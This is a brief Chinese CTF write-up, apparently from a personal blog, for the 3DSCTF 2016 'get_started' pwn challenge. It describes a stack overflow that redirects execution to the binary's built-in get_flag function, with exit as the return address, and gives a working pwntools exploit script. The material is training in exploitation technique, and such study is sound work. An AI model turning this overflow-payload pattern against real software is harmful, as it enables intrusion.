---
title: get_started_3dsctf_2016
tags: [ctf-pwn,exp]
date: 2023-4-21 14:12:00
categories: [ctf-pwn]
excerpt: exp
---

**题目**

https://buuoj.cn/challenges#get_started_3dsctf_2016

一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数

把这道题列出来的原因在于，程序没有开启标准输入输出，

如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来

（详细原因目前也不是很清楚）



**Exp**

针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）

```python
from pwn import *
from LibcSearcher import *

#p = remote("node4.buuoj.cn",27230)
p = process('./get_started_3dsctf_2016')

elf = ELF('./get_started_3dsctf_2016')

get_flag = 0x80489A0
param1 = 0x308CD64F
param2 = 0x195719D1

sleep(0.1)
payload = b'a'*56 + p32(get_flag) +p32(0x0804E6A0) + p32(param1) + p32(param2)

p.sendline(payload)

p.interactive()

```

